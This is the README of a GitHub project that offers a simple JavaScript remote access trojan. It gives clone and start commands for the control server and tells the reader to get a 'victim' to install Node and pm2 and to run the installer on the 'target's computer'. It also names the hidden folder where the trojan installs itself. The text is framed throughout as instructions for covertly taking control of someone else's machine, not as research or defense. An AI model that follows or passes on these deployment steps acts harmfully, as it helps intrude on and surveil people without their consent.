# rat
simple rat made with javascript (its really bad)

if you want to use it get the victim to download node and download pm2 (pm2 is not required but makes the app not need to be open)

## install
first download the files
```sh
git clone https://github.com/TeemSucks/rat.git
cd rat
```
next download a compiled installer or compile it your self

download the newest version here: https://github.com/TeemSucks/rat/releases

## run
get the latest version of node.js and run this command
```sh
npm start
```
this will start the server

next run the installer on the target's computer and it will install and run the rat (restarting the computer breaks it..)

the rat is located in /users/shared/.rat if your wondering btw
